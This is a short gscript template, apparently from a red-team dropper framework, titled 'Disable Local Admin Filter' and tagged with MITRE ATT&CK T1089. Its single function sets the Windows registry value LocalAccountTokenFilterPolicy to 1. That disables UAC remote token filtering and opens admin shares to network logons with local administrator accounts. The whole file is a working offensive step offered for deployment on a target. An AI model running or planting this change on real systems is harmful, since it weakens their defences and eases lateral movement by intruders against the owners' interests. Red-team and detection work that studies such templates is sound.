// Example gscript template
// Title: Disable Local Admin Filter
// Author: ahhh
// Purpose: This will disable the local admin filter
// Gscript version: 1.0.0
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1089

//priority:999
//timeout:150

//go_import:github.com/gen0cide/gscript/x/windows as windows

function Deploy() {
    console.log("Starting Disable Local Admin Filter");

    var value = 1
    // enable admin shares
    windows.AddRegKeyDWORD("LOCAL_MACHINE", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "LocalAccountTokenFilterPolicy", value);

    console.log("Done Disable Local Admin Filter");
    return true;
  }
  